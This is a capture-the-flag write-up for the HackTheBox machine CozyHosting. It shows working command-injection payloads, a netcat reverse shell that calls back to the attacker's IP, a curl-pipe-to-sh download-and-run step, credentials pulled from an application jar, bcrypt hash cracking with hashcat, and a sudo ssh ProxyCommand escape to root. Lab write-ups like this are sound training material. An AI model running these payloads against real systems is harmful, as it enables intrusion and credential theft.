
### Initial access
We searching the we and using endpoint /actuator and see mal endpoint
![[Assets/Pasted image 20260908181954.png]]

After time of tesing we finally find 2 para it base on ssh structure  username@host, and username hace os coomand injection
```
┌──(kali㉿kali)-[~/HTB/CozyHosting]
└─$ time curl -s -o /dev/null -X POST 'http://cozyhosting.htb/executessh' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'host=cozyhosting' \
  --data-urlencode 'username=root'

real    1.41s
user    0.00s
sys     0.01s
cpu     0%
                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB/CozyHosting]
└─$ time curl -s -o /dev/null -X POST 'http://cozyhosting.htb/executessh' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'host=cozyhosting' \
  --data-urlencode 'username=root;sleep${IFS}5;'

real    6.30s
user    0.01s
sys     0.00s
cpu     0%
                
```

Script to modify payload
```
#!/bin/bash

cmd="$*"
cmd="${cmd// /'${IFS}'}"

printf '%s\n' "$cmd"
```


We using fileless execute to avoid bad char
Our file
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.17.47 4444 >/tmp/f
```

Command to get shell
```
curl -s -o /dev/null -X POST 'http://cozyhosting.htb/executessh' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'host=cozyhosting' \
  --data-urlencode 'username=root;curl${IFS}http://10.10.17.47/revshell.sh${IFS}|${IFS}sh;' 
  
  
  
  ┌──(kali㉿kali)-[~/HTB/CozyHosting]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.17.47] from (UNKNOWN) [10.129.229.88] 38366
bash: cannot set terminal process group (1009): Inappropriate ioctl for device
bash: no job control in this shell
app@cozyhosting:/app$ id
id
uid=1001(app) gid=1001(app) groups=1001(app)
app@cozyhosting:/app$ 


```
### Lateral Movement
Extract data and see postgresql user change user
```
app@cozyhosting:/tmp$ unzip -p /app/cloudhosting-0.0.1.jar BOOT-INF/classes/application.properties | grep -Ei 'user|pass|secret|key|jdbc|datasource'
unzip -p /app/cloudhosting-0.0.1.jar BOOT-INF/classes/application.properties | grep -Ei 'user|pass|secret|key|jdbc|datasource'
spring.datasource.driver-class-name=org.postgresql.Driver
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR

app@cozyhosting:/tmp$ psql -h localhost -U postgres 
psql -h localhost -U postgres 
Password for user postgres: Vg&nvzAQ7XxR

psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# 

   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin

```

We crack hash of admin web pass

```bash
┌──(kali㉿kali)-[~/HTB/CozyHosting]
└─$ nano hash                                                                                                                                                                                                                             
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/CozyHosting]
└─$ hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt 
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #01: cpu-skylake-avx512-AMD Ryzen 7 8700G w/ Radeon 780M Graphics, 2901/5802 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory allocated for this attack: 512 MB (3732 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344388
* Bytes.....: 139921531
* Keyspace..: 14344388

$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => 



```

Cred `admin:manchesterunited`
Test on web dont see any thing test on user josh
```bash
app@cozyhosting:/tmp$ su josh
su josh
Password: manchesterunited

josh@cozyhosting:/tmp$ 

josh@cozyhosting:/tmp$ 

Sorry, try again.
[sudo] password for josh: 
Sorry, try again.
[sudo] password for josh: manchesterunited

Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
    
    josh@cozyhosting:/tmp$ sudo ssh -o ProxyCommand=';/bsudo ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
sudo ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
# id
id
uid=0(root) gid=0(root) groups=0(root)
# 



```
### Priv escalation
### Post exploit